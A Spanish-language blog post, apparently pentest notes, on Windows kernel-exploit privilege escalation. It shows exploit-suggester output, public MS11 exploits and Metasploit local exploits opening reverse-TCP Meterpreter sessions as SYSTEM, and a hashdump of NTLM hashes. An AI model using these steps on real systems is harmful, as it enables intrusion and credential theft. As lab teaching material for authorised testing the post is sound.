---
layout: post
title: Kernel Exploit
subtitle: Kernel Exploit
tags: [windows,kernel,privesc]
---

### Herramientas útiles

- WindowsExploitSuggester2
- Watson
- Secwiki (recompilación de exploits)

```
❯ sudo python windows-exploit-suggester.py --database 2021-04-16-mssb.xls -i ../systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 308 potential bulletins(s) with a database of 137 known exploits
[*] there are now 308 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows XP SP3 32-bit'
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-067: Vulnerabilities in Microsoft Office Excel Could Allow Remote Code Execution (972652) - Important
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-043: Vulnerabilities in Microsoft Office Web Components Could Allow Remote Code Execution (957638) - Critical
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

```
ms11-080.exe -O XP

whoami
NT AUTHORITY\SYSTEM
```

```
ms11-046.exe

whoami
NT AUTHORITY\SYSTEM
```

-----

## Metasploit

```
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          3                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.0.105 - Collecting local exploits for x86/windows...
[*] 192.168.0.105 - 40 exploit checks are being tried...
[+] 192.168.0.105 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 192.168.0.105 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.0.105 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.0.105 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 192.168.0.105 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

```
msf6 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 192.168.0.107:4444 
[*] Launching notepad to host the exploit...
[+] Process 1996 launched.
[*] Reflectively injecting the exploit DLL into 1996...
[*] Injecting exploit into 1996...
[*] Exploit injected. Injecting payload into 1996...
[*] Payload injected. Executing exploit...
[*] Sending stage (175174 bytes) to 192.168.0.105
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 5 opened (192.168.0.107:4444 -> 192.168.0.105:1102) at 2021-11-09 20:50:59 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 192.168.0.107:4444 
[*] Launching notepad to host the exploit...
[+] Process 1884 launched.
[*] Reflectively injecting the exploit DLL into 1884...
[*] Injecting exploit into 1884...
[*] Exploit injected. Injecting payload into 1884...
[*] Payload injected. Executing exploit...
[*] Sending stage (175174 bytes) to 192.168.0.105
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 6 opened (192.168.0.107:4444 -> 192.168.0.105:1103) at 2021-11-09 20:53:25 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**hashdump**: obtener los hashes de los usuarios del sistema

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:442be2ee41ed485431715f91a0020391:8f2d010f06432a0d8ffb02009debc8ef:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:b9832be9f6927b6d2b10f30f748b1947:::
test123:1003:624aac413795cdc1aad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
```

Aunque los Kernel Exploits son a menudo una forma facil de obtener sistema, deberian ser el ultimo recurso al realizar una prueba de penetración, ya que algunos de ellos tienen el riesgo de romper la máquina y un buen número de ellos solo se ejecutan una vez.
